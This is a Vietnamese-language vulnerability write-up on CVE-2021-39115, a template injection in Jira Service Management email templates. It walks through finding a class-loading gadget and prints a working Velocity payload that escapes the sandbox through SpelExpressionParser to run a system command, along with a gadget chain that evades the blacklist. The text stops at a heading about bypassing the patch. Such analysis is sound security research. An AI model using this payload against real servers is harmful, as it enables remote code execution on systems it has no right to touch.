# CVE-2021-39115
Template Injection in Email Templates leads to code execution on Jira Service Management Server

## I) Bulding  
Mình đã hướng dẫn deploy + debug [ở đây](https://github.com/PetrusViet/CVE-2019-11581), các bạn có thể tham khảo.
## II) Phân tích  
Trong [Description](https://jira.atlassian.com/browse/JSDSERVER-8665) của CVE này cũng đã nói rõ là bug nằm ở tính năng `Email Template`. Với quyền admin, user có thể tùy ý chỉnh sửa tempate của các email thông báo. Bug này cần quyền admin để thực hiện nên dù có RCE cũng không mấy nghiêm trọng, nhưng mình vẫn quyết định viết blog với mục đích cho vui :) bạn nào đang tìm hiểu SSTI có thể tham khảo.  

- Bắt đâu vào công chuyện, mình deploy bản `atlassian-jira-servicedesk-4.17.0-m0006-standalone` và thử diff xem nó với bản 4.18.0 có gì khác nhau:
![image](https://user-images.githubusercontent.com/63145078/132321608-7b237f04-6a51-41b6-9f4e-7ca62adc79b9.png)

Khi nhìn thấy đống này thì,.... tất nhiên là mình không đọc từng file một rồi, mình lười lắm. Đùa vậy chứ thực ra ngoài có thêm bản fix về security, các phiên bản còn có sự nâng cấp + thay đổi ở các tính năng. Mình diff tất cả rồi ngồi đọc như vậy rất tốn thời gian. Đương nhiên trong 1 số trường hợp mình phải chịu diff hết rồi ngồi đọc, nhưng với trường hợp này thì mình không làm thế =)))  

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132321714-a64051a5-3986-4456-8384-81f9433cdb54.jpg" />
</p>

- Như đã nói ở trên, admin có quyền đổi template của tất cả các email trong báo. Vì thế, bước đầu tiên là mình cần biết trong quá trình parse các email thông báo thì sẽ có những context gì? điều này là đặc biệt quan trọng trong khi muốn khai thác bug SSTI (có sử dụng sandbox). Cách hiểu quả nhất chính là debug nhảy vào đoạn parse email template để xem value của biến context.  
- Tất nhiên là sẽ có nhiều loại thông báo khác nhau (SignUp, change Password,...), mỗi loại sẽ sửa dụng một endpoint khác nhau. Mình sử dụng tính năng `SendBulkMail` để tạo email thông báo. Về stack call của endpoint này như thế nào thì mình xin phép không đề cập tới tránh dài dòng vì nó tương tự như stack call trong [CVE-2019-11581](https://github.com/PetrusViet/CVE-2019-11581)

Tại hàm `SimpleNote.render` mình có thể xem biến context để xem mình có thể tận dụng những gì:

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132326485-a6dc3315-89eb-4e2a-a3ae-fba6e1cdee67.png" />
</p>

Theo kinh nghiệm của riêng của mình, thì mình sẽ chú ý kiểm tra các context/class có những từ khóa như: Utils, Manager, service,... . Mình lưu ý thấy có context `$jirautils` (class com.atlassian.jira.util.JiraUtils) có chứa method `public static <T> T loadComponent(String className, Class<?> callingClass) `:  
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132327354-f11c8cbd-1269-4b3a-820b-969a9bde53a5.png" />
</p>

Mình lân la kiếm docs đọc xem chức năng của nó, nó xài như thế nào vì input đưa vào có String className cộng với output là một class nên rất có thể method này load class một cách tùy ý được:
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132327939-2ed443ee-c6e6-41d6-8c0d-1f2633b45b23.png" />
</p>

- Như docs có nói, hàm này để load các class :) Mình bắt đầu vào việc ngay xem method đó có thực sự load được class tùy ý hay không:

Mình bay vào `System -> Email templates` và tải file template hiện tại về máy  
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132328549-757ba4fe-e23d-4403-b65b-236faa0e29e8.png" />
</p>

Có rất nhiều template khác nhau, mỗi cái xài riêng cho một loại thông báo khác nhau nên mình kiếm cái file nào mà nó có thể xài chung cho nhiều loại thông báo khác nhau như `email\html\includes\header.vm`  
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132330698-0f6c48b0-30b5-44c0-8f1d-c378206e3c5b.png" />
</p>


Sau khi up file template đã chỉnh sửa lên, và sử dụng `SendBulkMail` để gửi một email thông báo đi. Mình nhận được output trong email như thế này:  
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132331018-8a0086eb-7a94-4719-82bb-38015fcfb994.png" />
</p>

Đại loại là class này không có constructors hoặc không được chấp nhận. Mình thử sử dụng một class khác có constructors (constructors không input) thử xem sao:  
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132331508-7a0daa91-8490-43f2-8841-dded2e5a1ba5.png" />
</p>

Và kết quả đúng như mong đợi. mình đã lấy được class thành công: 
<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132331766-6c0b644c-5a59-4ed1-80bb-6ee3ce078a66.png" />
</p> 


<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132332107-9abf31b5-2e99-491f-b69b-d9047be16f83.jpg" />
</p> 

- Như vậy là ta đã có thể load class *gần* tùy ý rồi, cũng khá ổn. Nhưng làm sao để có thể RCE ??? jira sử dụng velocity template và có sandbox *khá* đầy đủ, với blacklist packages và blacklist class (với blacklist class nó có thể chặn tất cả các class được extends từ những class trong blacklist). Việc sử dụng các class được public ở trên mạng là điều gần như không thể. Tới đây mình bắt buộc phải diff giữa bản lỗi và bản patch xem chúng khác nhau như thế nào, tất nhiên mình sẽ không diff toàn bộ mà sẽ chỉ diff ở file conf của velocity *(\atlassian-jira\WEB-INF\classes\velocity.properties)* để xem có gì mới update hay không:  

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132333357-b0d3a2e4-d279-4c37-b451-dfac34a7576e.png" />
</p> 

Ta thấy có 3 class được thêm vào blacklist : 

```
org.springframework.expression.spel.standard.SpelExpressionParser,\
com.atlassian.jira.component.ComponentAccessor,\
com.atlassian.jira.plugin.ComponentClassManager
```

Khi kiểm tra từng class, mình nhận thấy tại class `SpelExpressionParser` có hàm `public SpelExpression parseRaw(String expressionString)`, tra google một lát để tìm cách sử dụng thì đại loại nó có thể dùng như thế này:

```
#set($SpelExpressionParser = $jirautils.loadComponent('org.springframework.expression.spel.standard.SpelExpressionParser',$i18n.getClass()))
$SpelExpressionParser.parseRaw("T(java.lang.Runtime).getRuntime().exec('calc')")
```

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132334944-3ea30c38-b968-4db3-9ce0-f20efbad619e.png" />
</p> 

Như các bạn thấy, hàm `parseRaw` trả về một object là một class `org.springframework.expression.spel.standard.SpelExpression` chứ chưa thực sự render biểu thức mình đưa vào. Mình nhảy vào class `SpelExpression` và thấy có method `getValue`:  

```java
@Nullable
    public Object getValue() throws EvaluationException {
        CompiledExpression compiledAst = this.compiledAst;
        if (compiledAst != null) {
            try {
                EvaluationContext context = this.getEvaluationContext();
                return compiledAst.getValue(context.getRootObject().getValue(), context);
            } catch (Throwable var4) {
                if (this.configuration.getCompilerMode() != SpelCompilerMode.MIXED) {
                    throw new SpelEvaluationException(var4, SpelMessage.EXCEPTION_RUNNING_COMPILED_EXPRESSION, new Object[0]);
                }
            }

            this.compiledAst = null;
            this.interpretedCount.set(0);
        }

        ExpressionState expressionState = new ExpressionState(this.getEvaluationContext(), this.configuration);
        Object result = this.ast.getValue(expressionState);
        this.checkCompile(expressionState);
        return result;
    }
```

Nhìn vào input/output, một người chơi hệ tâm linh như mình quyết định thử luôn chứ không coi docs nữa:

```
#set($SpelExpressionParser = $jirautils.loadComponent('org.springframework.expression.spel.standard.SpelExpressionParser',$i18n.getClass()))
$SpelExpressionParser.parseRaw("T(java.lang.Runtime).getRuntime().exec('calc')").getValue()
```
và kết quả:  

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132335725-7af8cd87-102a-4dd7-a760-1603264cb376.png" />
</p> 

<p align="center">
  <img src="https://user-images.githubusercontent.com/63145078/132378122-bca57fd7-1bb2-41b4-8cb3-2918cbf3a7fc.jpg" />
</p> 

## III) Kết Luận

Như thế ta đã có thể bypass sanbox của velocity để RCE, thế nhưng khi đặt mình vào trường hợp của author - người tìm ra bug này thì còn có nhiều câu hỏi mà mình không thể giải thích được:
- Vì sao có tới 3 class được thêm vào black list?

khi mình tìm hiểu 3 class này, mình thấy chúng có thể tạo thành một chain: 
```
ComponentAccessor.getComponentClassManager() 
  => ComponentClassManager.newInstance(String className) (Class này có thể load class tùy ý)
        => SpelExpressionParser
```
nếu như author sử dụng `$jirautils` giống mình thì sẽ không cần tới 2 class kia làm gì. Nhưng nếu author không sử dụng `$jirautils` thì làm sao để có được ComponentAccessor???  
- Làm sao author có thể tìm ra được 3 class trên? Đây là câu hỏi mình lưu tâm và muốn được biết nhất, nhưng có lẽ chỉ có cách liên hệ trực tiếp với author thì mình mới biết được. Tiếc là mình không biết author của bug này là ai.  

### IV) Tiếp tục bypass bản patch

